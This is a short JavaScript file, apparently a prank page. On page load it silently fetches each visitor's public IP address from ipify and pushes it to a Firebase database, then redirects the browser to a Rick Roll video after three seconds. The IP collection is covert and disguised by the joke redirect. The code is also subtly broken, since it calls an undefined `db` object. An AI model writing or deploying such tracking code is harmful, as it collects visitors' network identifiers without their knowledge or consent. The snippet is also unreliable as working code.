import firebase from 'firebase/app';
import 'firebase/database';

const RICK_ROLL = 'https://www.youtube.com/watch?v=dQw4bXcQXcQ';

const config = {
    apiKey: '<API_KEY>',
    authDomain: '<AUTH_DOMAIN>',
    databaseURL: 'https://<DATABASE_URL>.firebaseio.com'
};
firebase.initializeApp(config);

async function getRealIP() {
    try {
        const response = await fetch('https://api.ipify.org/?format=json');
        if (!response.ok) {
            throw new Error('Failed to fetch IP address');
        }
        const data = await response.json();
        return data.ip;
    } catch (error) {
        throw new Error('Failed to fetch IP address: ' + error);
    }
}

async function submitIpToFirebase() {

    try {
        const ip = await getRealIP();
        db.ref('ips').push(ip);
    } catch (error) {
        console.log("Error getting IP address: " + error);
    }
    
    setTimeout(() => window.open(RICK_ROLL, '_self'), 3000);
}

window.addEventListener("load", submitIpToFirebase);